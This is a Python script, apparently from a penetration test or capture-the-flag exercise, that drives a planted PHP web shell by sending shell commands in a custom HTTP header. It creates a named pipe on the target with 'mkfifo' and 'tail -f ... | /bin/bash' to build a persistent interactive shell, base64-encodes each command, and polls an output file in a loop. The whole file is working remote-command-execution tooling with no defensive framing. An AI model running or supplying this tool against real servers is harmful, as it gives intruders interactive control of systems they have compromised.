#!/bin/env python3

import requests
import threading
import sys
from base64 import b64encode
import random
from time import sleep

# EDIT THIS
url = ""
#url = "http://localhost:8000/malicious.php"

# Create pipe
tmp_name = random.randrange(10000,99999)
input_name = f"/tmp/in{tmp_name}"
output_name = f"/tmp/out{tmp_name}"

def recvOutput():
    payload = f"/usr/bin/cat {output_name} && /usr/bin/echo -n '' > {output_name}"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text

def sendPayload(payload):
    b64str = b64encode(bytes(payload,'utf-8') + b'\n').decode()
    payload = f"/usr/bin/echo '{b64str}' | base64 -d > {input_name}"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text


def createPipeListen():
    payload = f"bash -c 'rm {input_name};rm {output_name}; mkfifo {input_name}'"
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    r = requests.get(url, headers=headers, proxies=proxies)
    payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1'"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    print("hazir")
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text


init = threading.Thread(target=createPipeListen, args=())
init.start()
print("basliye 5 sn")
sleep(5)

print("payload gitti")
sendPayload("id")

print("bekle 1 sn geliyor")
sleep(1)
print(recvOutput())
print("geldi")

def lis_th():
    while True:
        txt = recvOutput()
        print(txt, end='')
        sleep(0.5)

listenin_th = threading.Thread(target=lis_th, args=())
listenin_th.start()

while True:
    inp = input()
    txt = sendPayload(inp)
    print(recvOutput(), end='')



print("bitirmek gerek tmp silmek fln")



